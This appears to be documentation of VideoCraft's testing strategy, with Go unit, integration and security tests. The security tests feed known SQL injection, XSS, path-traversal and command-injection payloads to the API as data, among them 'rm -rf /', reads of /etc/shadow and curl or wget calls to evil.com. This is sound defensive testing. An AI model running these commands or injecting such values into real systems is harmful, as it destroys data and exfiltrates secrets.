# Testing Strategy

VideoCraft uses comprehensive testing to ensure reliability and security.

## Testing Types

### Unit Tests
```go
func TestAudioService_AnalyzeAudio(t *testing.T) {
    service := &audioService{
        cfg: &config.Config{},
        log: logger.NewNoop(),
    }
    
    ctx := context.Background()
    info, err := service.AnalyzeAudio(ctx, "test-url")
    
    assert.NoError(t, err)
    assert.NotNil(t, info)
}
```

### Integration Tests

Integration tests validate complete workflows end-to-end, ensuring all components work together correctly. These tests simulate real user scenarios and verify the entire video generation pipeline.

#### End-to-End Video Generation Test
```go
func TestVideoGeneration_CompleteWorkflow(t *testing.T) {
    // Setup test server and dependencies
    cfg := &config.Config{
        Server: config.ServerConfig{Host: "localhost", Port: 3002},
        FFmpeg: config.FFmpegConfig{BinaryPath: "ffmpeg"},
        Storage: config.StorageConfig{
            OutputDir: "/tmp/test-output",
            TempDir:   "/tmp/test-temp",
        },
    }
    
    server := setupTestServer(t, cfg)
    defer server.Close()
    
    // Prepare test video configuration
    videoConfig := VideoConfig{
        Scenes: []Scene{
            {
                ID: "intro",
                Elements: []Element{
                    {
                        Type: "audio",
                        Src:  "https://example.com/test-audio.mp3",
                        Volume: 1.0,
                    },
                },
            },
        },
        SubtitleSettings: SubtitleSettings{
            FontSize: 24,
            FontColor: "#FFFFFF",
            Progressive: true,
        },
    }
    
    // Execute complete workflow
    t.Run("SubmitJob", func(t *testing.T) {
        resp := submitVideoGenerationJob(t, server.URL, videoConfig)
        assert.Equal(t, http.StatusAccepted, resp.StatusCode)
        assert.NotEmpty(t, resp.JobID)
    })
    
    t.Run("ProcessJob", func(t *testing.T) {
        // Wait for job completion with timeout
        jobID := getJobID(t, server.URL, videoConfig)
        waitForJobCompletion(t, server.URL, jobID, 60*time.Second)
        
        // Verify job status
        status := getJobStatus(t, server.URL, jobID)
        assert.Equal(t, "completed", status.Status)
        assert.NotEmpty(t, status.OutputPath)
    })
    
    t.Run("VerifyOutput", func(t *testing.T) {
        jobID := getJobID(t, server.URL, videoConfig)
        outputPath := getJobOutput(t, server.URL, jobID)
        
        // Verify video file exists and is valid
        assert.FileExists(t, outputPath)
        
        // Verify video properties using FFmpeg
        videoInfo := analyzeVideoFile(t, outputPath)
        assert.Greater(t, videoInfo.Duration, 0.0)
        assert.Equal(t, "mp4", videoInfo.Format)
        assert.True(t, videoInfo.HasSubtitles)
    })
}
```

#### API Integration Test
```go
func TestAPI_VideoGenerationEndpoints(t *testing.T) {
    server := setupTestAPIServer(t)
    defer server.Close()
    
    client := &http.Client{Timeout: 30 * time.Second}
    
    t.Run("HealthCheck", func(t *testing.T) {
        resp, err := client.Get(server.URL + "/health")
        assert.NoError(t, err)
        assert.Equal(t, http.StatusOK, resp.StatusCode)
    })
    
    t.Run("GenerateVideo", func(t *testing.T) {
        payload := `{
            "scenes": [{
                "id": "test",
                "elements": [{
                    "type": "audio",
                    "src": "https://example.com/audio.mp3"
                }]
            }]
        }`
        
        resp, err := client.Post(
            server.URL+"/api/v1/generate-video",
            "application/json",
            strings.NewReader(payload),
        )
        
        assert.NoError(t, err)
        assert.Equal(t, http.StatusAccepted, resp.StatusCode)
    })
    
    t.Run("JobStatus", func(t *testing.T) {
        jobID := "test-job-123"
        resp, err := client.Get(server.URL + "/api/v1/jobs/" + jobID)
        
        assert.NoError(t, err)
        assert.Equal(t, http.StatusOK, resp.StatusCode)
    })
}
```

#### Progressive Subtitles Integration Test
```go
func TestProgressiveSubtitles_Integration(t *testing.T) {
    // Test the complete progressive subtitles workflow
    transcriptionService := setupMockTranscriptionService(t)
    subtitleService := NewSubtitleService(transcriptionService)
    
    audioURL := "https://example.com/speech.mp3"
    settings := SubtitleSettings{
        Progressive: true,
        FontSize:    24,
        FontColor:   "#FFFFFF",
        WordTiming:  true,
    }
    
    t.Run("GenerateProgressiveSubtitles", func(t *testing.T) {
        subtitles, err := subtitleService.GenerateSubtitles(context.Background(), audioURL, settings)
        
        assert.NoError(t, err)
        assert.NotEmpty(t, subtitles)
        
        // Verify progressive timing (no gaps between words)
        for i := 1; i < len(subtitles); i++ {
            prevEnd := subtitles[i-1].EndTime
            currentStart := subtitles[i].StartTime
            
            // Progressive subtitles should have zero gap or minimal overlap
            timeDiff := currentStart - prevEnd
            assert.LessOrEqual(t, timeDiff, 0.1, "Gap between subtitles too large")
        }
    })
    
    t.Run("WordLevelTiming", func(t *testing.T) {
        // Verify word-level timing accuracy
        subtitles, _ := subtitleService.GenerateSubtitles(context.Background(), audioURL, settings)
        
        for _, subtitle := range subtitles {
            assert.Greater(t, subtitle.Duration, 0.0)
            assert.NotEmpty(t, subtitle.Text)
            assert.LessOrEqual(t, subtitle.Duration, 10.0, "Subtitle duration too long")
        }
    })
}
```

#### Security Integration Test
```go
func TestSecurity_IntegrationWorkflow(t *testing.T) {
    server := setupSecureTestServer(t)
    defer server.Close()
    
    t.Run("AuthenticationRequired", func(t *testing.T) {
        // Test without authentication
        resp, err := http.Post(server.URL+"/api/v1/generate-video", "application/json", nil)
        assert.NoError(t, err)
        assert.Equal(t, http.StatusUnauthorized, resp.StatusCode)
    })
    
    t.Run("CSRFProtection", func(t *testing.T) {
        // Test CSRF protection
        client := &http.Client{}
        req, _ := http.NewRequest("POST", server.URL+"/api/v1/generate-video", nil)
        req.Header.Set("Authorization", "Bearer valid-token")
        
        resp, err := client.Do(req)
        assert.NoError(t, err)
        assert.Equal(t, http.StatusForbidden, resp.StatusCode)
    })
    
    t.Run("InputValidation", func(t *testing.T) {
        // Test malicious input handling
        maliciousPayload := `{"scenes":[{"elements":[{"src":"javascript:alert('xss')"}]}]}`
        
        resp := makeAuthenticatedRequest(t, server.URL, maliciousPayload)
        assert.Equal(t, http.StatusBadRequest, resp.StatusCode)
    })
}
```

#### Running Integration Tests

```bash
# Run all integration tests
go test -tags=integration ./tests/integration/...

# Run specific integration test suites
go test -tags=integration -run TestVideoGeneration ./tests/integration/
go test -tags=integration -run TestAPI ./tests/integration/
go test -tags=integration -run TestSecurity ./tests/integration/

# Run integration tests with verbose output
go test -tags=integration -v ./tests/integration/...

# Run integration tests with coverage
go test -tags=integration -cover ./tests/integration/...
```

#### Integration Test Configuration

Integration tests require additional setup and configuration:

```yaml
# tests/integration/config.yaml
test_config:
  server:
    host: "localhost"
    port: 0  # Use random available port
    
  storage:
    output_dir: "/tmp/videocraft-integration-tests/output"
    temp_dir: "/tmp/videocraft-integration-tests/temp"
    cleanup_after_test: true
    
  ffmpeg:
    binary_path: "ffmpeg"
    timeout: "60s"
    
  transcription:
    mock_service: true  # Use mock for faster tests
    python_model: "tiny"  # Use smallest model for speed
    
  security:
    enable_auth: true
    enable_csrf: true
    test_api_key: "test-api-key-12345"
```

### Security Tests

Security tests are critical for ensuring VideoCraft's resilience against various attack vectors. These tests validate authentication, authorization, input validation, and overall system security posture.

#### Authentication and Authorization Tests

##### Authentication Bypass Tests
```go
func TestAuth_BypassAttempts(t *testing.T) {
    server := setupSecureTestServer(t)
    defer server.Close()
    
    protectedEndpoint := server.URL + "/api/v1/generate-video"
    
    t.Run("NoAuthHeader", func(t *testing.T) {
        resp, err := http.Post(protectedEndpoint, "application/json", nil)
        assert.NoError(t, err)
        assert.Equal(t, http.StatusUnauthorized, resp.StatusCode)
        
        var errorResp map[string]interface{}
        json.NewDecoder(resp.Body).Decode(&errorResp)
        assert.Equal(t, "AUTHENTICATION_REQUIRED", errorResp["code"])
    })
    
    t.Run("InvalidTokenFormat", func(t *testing.T) {
        req, _ := http.NewRequest("POST", protectedEndpoint, nil)
        req.Header.Set("Authorization", "InvalidFormat token123")
        
        client := &http.Client{}
        resp, err := client.Do(req)
        assert.NoError(t, err)
        assert.Equal(t, http.StatusUnauthorized, resp.StatusCode)
    })
    
    t.Run("ExpiredToken", func(t *testing.T) {
        expiredToken := generateExpiredJWT(t)
        req, _ := http.NewRequest("POST", protectedEndpoint, nil)
        req.Header.Set("Authorization", "Bearer "+expiredToken)
        
        client := &http.Client{}
        resp, err := client.Do(req)
        assert.NoError(t, err)
        assert.Equal(t, http.StatusUnauthorized, resp.StatusCode)
    })
    
    t.Run("TokenReuse", func(t *testing.T) {
        // Test if same token can be used multiple times (should be allowed)
        // but with rate limiting applied
        token := getValidTestToken(t)
        
        for i := 0; i < 10; i++ {
            req, _ := http.NewRequest("POST", protectedEndpoint, nil)
            req.Header.Set("Authorization", "Bearer "+token)
            
            client := &http.Client{}
            resp, _ := client.Do(req)
            
            if i < 5 {
                assert.NotEqual(t, http.StatusTooManyRequests, resp.StatusCode)
            } else {
                // Should hit rate limit
                assert.Equal(t, http.StatusTooManyRequests, resp.StatusCode)
            }
        }
    })
}
```

##### Authorization Privilege Escalation Tests
```go
func TestAuth_PrivilegeEscalation(t *testing.T) {
    server := setupTestServerWithRoles(t)
    defer server.Close()
    
    t.Run("AdminEndpointAccess", func(t *testing.T) {
        // Regular user token trying to access admin endpoint
        userToken := getUserToken(t, "regular_user")
        adminEndpoint := server.URL + "/api/v1/admin/users"
        
        req, _ := http.NewRequest("GET", adminEndpoint, nil)
        req.Header.Set("Authorization", "Bearer "+userToken)
        
        client := &http.Client{}
        resp, err := client.Do(req)
        assert.NoError(t, err)
        assert.Equal(t, http.StatusForbidden, resp.StatusCode)
    })
    
    t.Run("CrossTenantAccess", func(t *testing.T) {
        // User from tenant A trying to access tenant B resources
        tenantAToken := getTenantToken(t, "tenant_a", "user1")
        tenantBResource := server.URL + "/api/v1/tenant/tenant_b/jobs"
        
        req, _ := http.NewRequest("GET", tenantBResource, nil)
        req.Header.Set("Authorization", "Bearer "+tenantAToken)
        
        client := &http.Client{}
        resp, err := client.Do(req)
        assert.NoError(t, err)
        assert.Equal(t, http.StatusForbidden, resp.StatusCode)
    })
}
```

#### Input Validation and Fuzzing Tests

##### SQL Injection Prevention Tests
```go
func TestSecurity_SQLInjectionPrevention(t *testing.T) {
    server := setupTestServer(t)
    defer server.Close()
    
    sqlInjectionPayloads := []string{
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES ('admin', 'hacked'); --",
        "' OR 1=1 /*",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' or 1=1#",
        "' or 1=1--",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
    }
    
    for _, payload := range sqlInjectionPayloads {
        t.Run("SQLInjection_"+payload, func(t *testing.T) {
            videoConfig := map[string]interface{}{
                "scenes": []map[string]interface{}{
                    {
                        "id": payload, // Inject into scene ID
                        "elements": []map[string]interface{}{
                            {
                                "type": "audio",
                                "src":  "https://example.com/audio.mp3",
                            },
                        },
                    },
                },
                "comment": payload, // Also test in comment field
            }
            
            resp := makeAuthenticatedRequest(t, server.URL+"/api/v1/generate-video", videoConfig)
            
            // Should reject malicious input
            assert.True(t, resp.StatusCode == http.StatusBadRequest || 
                       resp.StatusCode == http.StatusUnprocessableEntity,
                       "Should reject SQL injection payload: %s", payload)
        })
    }
}
```

##### XSS Prevention Tests
```go
func TestSecurity_XSSPrevention(t *testing.T) {
    server := setupTestServer(t)
    defer server.Close()
    
    xssPayloads := []string{
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "';alert('xss');//",
        "<iframe src=javascript:alert('xss')></iframe>",
        "<body onload=alert('xss')>",
        "<input onfocus=alert('xss') autofocus>",
        "<select onfocus=alert('xss') autofocus>",
        "<textarea onfocus=alert('xss') autofocus>",
        "<keygen onfocus=alert('xss') autofocus>",
        "<video><source onerror=alert('xss')>",
        "<audio src=x onerror=alert('xss')>",
    }
    
    for _, payload := range xssPayloads {
        t.Run("XSS_"+payload, func(t *testing.T) {
            videoConfig := map[string]interface{}{
                "scenes": []map[string]interface{}{
                    {
                        "id": "test",
                        "elements": []map[string]interface{}{
                            {
                                "type": "audio",
                                "src":  payload, // XSS in src field
                            },
                        },
                    },
                },
                "comment": payload,
            }
            
            resp := makeAuthenticatedRequest(t, server.URL+"/api/v1/generate-video", videoConfig)
            assert.Equal(t, http.StatusBadRequest, resp.StatusCode,
                        "Should reject XSS payload: %s", payload)
        })
    }
}
```

##### Command Injection Prevention Tests
```go
func TestSecurity_CommandInjectionPrevention(t *testing.T) {
    server := setupTestServer(t)
    defer server.Close()
    
    commandInjectionPayloads := []string{
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& curl http://malicious.com",
        "; wget http://evil.com/script.sh",
        "| nc -l 4444",
        "; python -c 'import os; os.system(\"ls\")'",
        "&& echo 'hacked' > /tmp/pwned",
        "; sleep 10",
        "| curl -X POST http://evil.com --data-binary @/etc/hosts",
        "; $(curl http://malicious.com/payload)",
        "&& mkdir /tmp/backdoor",
        "| base64 /etc/shadow",
    }
    
    for _, payload := range commandInjectionPayloads {
        t.Run("CommandInjection_"+payload, func(t *testing.T) {
            // Test command injection in various fields
            testCases := []struct {
                field string
                value string
            }{
                {"audio_src", "https://example.com/audio.mp3" + payload},
                {"scene_id", "scene" + payload},
                {"comment", "test comment" + payload},
            }
            
            for _, tc := range testCases {
                videoConfig := createBasicVideoConfig()
                setFieldValue(videoConfig, tc.field, tc.value)
                
                resp := makeAuthenticatedRequest(t, server.URL+"/api/v1/generate-video", videoConfig)
                assert.Equal(t, http.StatusBadRequest, resp.StatusCode,
                            "Should reject command injection in %s: %s", tc.field, payload)
            }
        })
    }
}
```

##### Path Traversal Prevention Tests
```go
func TestSecurity_PathTraversalPrevention(t *testing.T) {
    server := setupTestServer(t)
    defer server.Close()
    
    pathTraversalPayloads := []string{
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "/var/www/../../etc/passwd",
        "file:///etc/passwd",
        "file://./etc/passwd",
        "....\\....\\....\\etc\\passwd",
    }
    
    for _, payload := range pathTraversalPayloads {
        t.Run("PathTraversal_"+payload, func(t *testing.T) {
            // Test file-based endpoints
            endpoints := []string{
                "/api/v1/jobs/12345/output/" + payload,
                "/api/v1/download/" + payload,
                "/static/" + payload,
            }
            
            for _, endpoint := range endpoints {
                resp := makeAuthenticatedGetRequest(t, server.URL+endpoint)
                assert.True(t, resp.StatusCode == http.StatusBadRequest || 
                           resp.StatusCode == http.StatusNotFound ||
                           resp.StatusCode == http.StatusForbidden,
                           "Should reject path traversal: %s", payload)
            }
        })
    }
}
```

#### Input Fuzzing Techniques

##### Property-Based Fuzzing
```go
func TestSecurity_PropertyBasedFuzzing(t *testing.T) {
    if testing.Short() {
        t.Skip("Skipping property-based fuzzing in short mode")
    }
    
    server := setupTestServer(t)
    defer server.Close()
    
    // Property: All malformed JSON should be rejected
    t.Run("MalformedJSONProperty", func(t *testing.T) {
        quick.Check(func(randomBytes []byte) bool {
            // Skip valid JSON
            var js json.RawMessage
            if json.Unmarshal(randomBytes, &js) == nil {
                return true
            }
            
            resp, err := http.Post(
                server.URL+"/api/v1/generate-video",
                "application/json",
                bytes.NewReader(randomBytes),
            )
            if err != nil {
                return true // Network errors are acceptable
            }
            defer resp.Body.Close()
            
            // Property: Invalid JSON should never return 200
            return resp.StatusCode != http.StatusOK
        }, nil)
    })
    
    // Property: Large inputs should be rejected gracefully
    t.Run("LargeInputProperty", func(t *testing.T) {
        quick.Check(func(size uint16) bool {
            if size < 100 {
                return true // Skip small sizes
            }
            
            largePayload := strings.Repeat("a", int(size)*1000)
            videoConfig := map[string]interface{}{
                "comment": largePayload,
                "scenes": []map[string]interface{}{
                    {
                        "id": "test",
                        "elements": []map[string]interface{}{
                            {
                                "type": "audio",
                                "src":  "https://example.com/audio.mp3",
                            },
                        },
                    },
                },
            }
            
            resp := makeAuthenticatedRequest(t, server.URL+"/api/v1/generate-video", videoConfig)
            
            // Property: Large inputs should be rejected or processed without crash
            return resp.StatusCode == http.StatusBadRequest ||
                   resp.StatusCode == http.StatusRequestEntityTooLarge ||
                   resp.StatusCode == http.StatusAccepted
        }, nil)
    })
}
```

##### Automated Fuzzing with go-fuzz
```go
// +build gofuzz

package handlers

import (
    "bytes"
    "net/http/httptest"
    "net/http"
)

// FuzzVideoHandler fuzzes the video generation endpoint
func FuzzVideoHandler(data []byte) int {
    server := setupFuzzTestServer()
    defer server.Close()
    
    req := httptest.NewRequest("POST", "/api/v1/generate-video", bytes.NewReader(data))
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("Authorization", "Bearer test-token")
    
    rr := httptest.NewRecorder()
    server.Handler.ServeHTTP(rr, req)
    
    // Return 1 if interesting (found a crash or unexpected behavior)
    if rr.Code >= 500 {
        panic("Server error encountered during fuzzing")
    }
    
    return 0
}
```

#### Dependency Vulnerability Scanning

##### Automated Dependency Checks
```go
func TestSecurity_DependencyVulnerabilities(t *testing.T) {
    t.Run("GoDependencyCheck", func(t *testing.T) {
        // Run govulncheck to scan for known vulnerabilities
        cmd := exec.Command("govulncheck", "./...")
        output, err := cmd.CombinedOutput()
        
        if err != nil {
            // govulncheck returns non-zero exit code if vulnerabilities found
            t.Logf("Dependency vulnerabilities found:\n%s", string(output))
            
            // Parse output to check for critical vulnerabilities
            if strings.Contains(string(output), "HIGH") || 
               strings.Contains(string(output), "CRITICAL") {
                t.Errorf("Critical vulnerabilities found in dependencies")
            }
        }
    })
    
    t.Run("PythonDependencyCheck", func(t *testing.T) {
        // Check Python dependencies (for Whisper)
        cmd := exec.Command("python3", "-m", "safety", "check", "-r", "scripts/requirements.txt")
        output, err := cmd.CombinedOutput()
        
        if err != nil {
            t.Logf("Python dependency vulnerabilities found:\n%s", string(output))
            
            // Allow known false positives but fail on real vulnerabilities
            if !strings.Contains(string(output), "No known security vulnerabilities found") {
                t.Errorf("Python dependency vulnerabilities found")
            }
        }
    })
    
    t.Run("DockerImageScan", func(t *testing.T) {
        if testing.Short() {
            t.Skip("Skipping Docker image scan in short mode")
        }
        
        // Scan Docker image for vulnerabilities using Trivy
        cmd := exec.Command("trivy", "image", "--severity", "HIGH,CRITICAL", "videocraft:latest")
        output, err := cmd.CombinedOutput()
        
        if err != nil {
            t.Logf("Docker image vulnerabilities found:\n%s", string(output))
        }
        
        // Check if any HIGH or CRITICAL vulnerabilities found
        lines := strings.Split(string(output), "\n")
        vulnerabilityCount := 0
        for _, line := range lines {
            if strings.Contains(line, "HIGH") || strings.Contains(line, "CRITICAL") {
                vulnerabilityCount++
            }
        }
        
        if vulnerabilityCount > 0 {
            t.Errorf("Found %d HIGH/CRITICAL vulnerabilities in Docker image", vulnerabilityCount)
        }
    })
}
```

#### Performance Security Tests

##### Denial of Service (DoS) Prevention
```go
func TestSecurity_DoSPrevention(t *testing.T) {
    server := setupTestServer(t)
    defer server.Close()
    
    t.Run("RateLimitingEnforcement", func(t *testing.T) {
        // Rapid fire requests to test rate limiting
        client := &http.Client{Timeout: 1 * time.Second}
        
        var successCount, rateLimitedCount int
        for i := 0; i < 100; i++ {
            resp, err := client.Post(
                server.URL+"/api/v1/generate-video",
                "application/json",
                strings.NewReader(`{"scenes":[{"id":"test","elements":[{"type":"audio","src":"https://example.com/audio.mp3"}]}]}`),
            )
            
            if err != nil {
                continue
            }
            
            if resp.StatusCode == http.StatusTooManyRequests {
                rateLimitedCount++
            } else if resp.StatusCode == http.StatusAccepted {
                successCount++
            }
            
            resp.Body.Close()
        }
        
        assert.Greater(t, rateLimitedCount, 0, "Rate limiting should be enforced")
        assert.Greater(t, successCount, 0, "Some requests should succeed")
    })
    
    t.Run("ConnectionLimitEnforcement", func(t *testing.T) {
        var wg sync.WaitGroup
        connectionCount := 200
        successfulConnections := int32(0)
        
        for i := 0; i < connectionCount; i++ {
            wg.Add(1)
            go func() {
                defer wg.Done()
                
                client := &http.Client{Timeout: 5 * time.Second}
                resp, err := client.Get(server.URL + "/health")
                if err == nil && resp.StatusCode == http.StatusOK {
                    atomic.AddInt32(&successfulConnections, 1)
                    resp.Body.Close()
                }
            }()
        }
        
        wg.Wait()
        
        // Should handle reasonable number of connections
        assert.Greater(t, int(successfulConnections), connectionCount/2,
                     "Should handle reasonable connection load")
    })
    
    t.Run("ResourceExhaustionPrevention", func(t *testing.T) {
        // Test with extremely large video configurations
        largeConfig := map[string]interface{}{
            "scenes": make([]map[string]interface{}, 1000), // 1000 scenes
        }
        
        for i := 0; i < 1000; i++ {
            largeConfig["scenes"].([]map[string]interface{})[i] = map[string]interface{}{
                "id": fmt.Sprintf("scene_%d", i),
                "elements": []map[string]interface{}{
                    {
                        "type": "audio",
                        "src":  "https://example.com/audio.mp3",
                    },
                },
            }
        }
        
        resp := makeAuthenticatedRequest(t, server.URL+"/api/v1/generate-video", largeConfig)
        
        // Should reject overly complex configurations
        assert.True(t, resp.StatusCode == http.StatusBadRequest ||
                   resp.StatusCode == http.StatusRequestEntityTooLarge,
                   "Should reject resource-exhausting configurations")
    })
}
```

#### Security Test Execution

##### Running Security Tests
```bash
# Run all security tests
go test -tags=security ./tests/security/...

# Run specific security test suites
go test -tags=security -run TestAuth ./tests/security/
go test -tags=security -run TestSecurity_XSS ./tests/security/
go test -tags=security -run TestSecurity_SQL ./tests/security/

# Run security tests with verbose output
go test -tags=security -v ./tests/security/...

# Run security tests with race detection
go test -tags=security -race ./tests/security/...

# Run property-based fuzzing tests
go test -tags=security -run TestSecurity_PropertyBased ./tests/security/

# Run dependency vulnerability scans
make security-scan

# Run comprehensive security test suite
make security-test-full
```

##### Continuous Security Testing
```yaml
# .github/workflows/security-tests.yml
name: Security Tests

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron: '0 2 * * *'  # Daily at 2 AM

jobs:
  security-tests:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Go
      uses: actions/setup-go@v3
      with:
        go-version: 1.21
        
    - name: Install security tools
      run: |
        go install golang.org/x/vuln/cmd/govulncheck@latest
        pip install safety
        
    - name: Run security tests
      run: |
        go test -tags=security -v ./tests/security/...
        
    - name: Dependency vulnerability scan
      run: |
        govulncheck ./...
        safety check -r scripts/requirements.txt
        
    - name: Static analysis security scan
      run: |
        go vet ./...
        go run honnef.co/go/tools/cmd/staticcheck@latest ./...
```

#### Security Test Configuration

##### Test Environment Setup
```yaml
# tests/security/config.yaml
security_test_config:
  authentication:
    test_tokens:
      valid: "test-token-valid-12345"
      expired: "test-token-expired-67890"
      invalid: "invalid-token-format"
    
  rate_limiting:
    requests_per_minute: 60
    burst_limit: 10
    
  input_validation:
    max_request_size: "1MB"
    max_string_length: 1000
    allowed_file_types: ["mp3", "wav", "mp4", "avi"]
    
  fuzzing:
    iterations: 1000
    max_input_size: 65536
    crash_detection: true
    
  vulnerability_scanning:
    govulncheck_enabled: true
    safety_check_enabled: true
    docker_scan_enabled: true
    severity_threshold: "HIGH"
```

##### Security Test Utilities
```go
// tests/security/utils.go
package security

import (
    "crypto/rand"
    "encoding/hex"
    "net/http"
    "testing"
    "time"
)

func GenerateRandomPayload(size int) string {
    bytes := make([]byte, size)
    rand.Read(bytes)
    return hex.EncodeToString(bytes)
}

func MakeRequestWithTimeout(t *testing.T, url string, timeout time.Duration) *http.Response {
    client := &http.Client{Timeout: timeout}
    resp, err := client.Get(url)
    if err != nil {
        t.Logf("Request failed: %v", err)
        return nil
    }
    return resp
}

func AssertSecurityHeaders(t *testing.T, resp *http.Response) {
    requiredHeaders := map[string]string{
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options":        "DENY",
        "X-XSS-Protection":       "1; mode=block",
    }
    
    for header, expectedValue := range requiredHeaders {
        actual := resp.Header.Get(header)
        if actual != expectedValue {
            t.Errorf("Missing or incorrect security header %s: got %s, want %s", 
                    header, actual, expectedValue)
        }
    }
}
```

#### Security Testing Best Practices

1. **Test Early and Often**: Run security tests in CI/CD pipeline
2. **Comprehensive Coverage**: Test all input vectors and attack surfaces  
3. **Real-world Scenarios**: Use actual exploit payloads and techniques
4. **Performance Impact**: Ensure security tests don't significantly slow development
5. **False Positive Management**: Maintain allow-lists for known safe patterns
6. **Documentation**: Keep security test cases updated with threat landscape

#### Related Security Documentation

- [Security Overview](../security/overview.md) - Multi-layered security architecture
- [CORS & CSRF Protection](../security/cors-csrf.md) - HTTP security implementation  
- [Vulnerability Management](../security/vulnerability-management.md) - Security monitoring
- [Best Practices](../security/best-practices.md) - Security guidelines
- [FFmpeg Security](../security/ffmpeg-security.md) - Command injection prevention

#### External Security Testing Tools

- **govulncheck**: Go vulnerability database scanner
- **safety**: Python dependency vulnerability scanner  
- **Trivy**: Container image vulnerability scanner
- **OWASP ZAP**: Web application security testing
- **Burp Suite**: Professional web security testing
- **sqlmap**: Automated SQL injection testing
- **ffuf**: Fast web fuzzer for directory/file enumeration

These security tests ensure VideoCraft maintains a robust security posture against common and advanced attack vectors.